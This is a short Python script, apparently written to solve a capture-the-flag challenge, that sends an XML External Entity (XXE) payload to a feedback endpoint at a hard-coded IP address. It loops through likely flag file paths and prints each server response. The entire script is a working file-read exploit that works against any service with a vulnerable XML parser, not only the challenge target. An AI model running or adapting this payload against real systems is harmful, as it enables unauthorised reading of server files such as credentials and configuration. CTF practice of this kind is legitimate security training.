#!/usr/bin/env python3
import requests

BASE_URL = "http://15.206.47.5:5000/feedback"

# Common places for flags in CTFs
CANDIDATE_PATHS = [
    "/flag",
    "/flag.txt",
    "/root/flag",
    "/root/flag.txt",
    "//flag.txt",
    "///flag.txt"
]

xml_template = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{path}">
]>
<feedback>
    <name>&xxe;</name>
    <message>test</message>
</feedback>
"""

def try_path(path: str):
    xml = xml_template.format(path=path)
    headers = {
        "Content-Type": "application/xml"
    }
    print(f"\n[*] Trying path: {path}")
    resp = requests.post(BASE_URL, data=xml, headers=headers)
    print(f"[+] HTTP {resp.status_code}")
    print(resp.text)  # Look in this HTML for the flag


def main():
    for p in CANDIDATE_PATHS:
        try:
            try_path(p)
        except Exception as e:
            print(f"[!] Error with {p}: {e}")


if __name__ == "__main__":
    main()
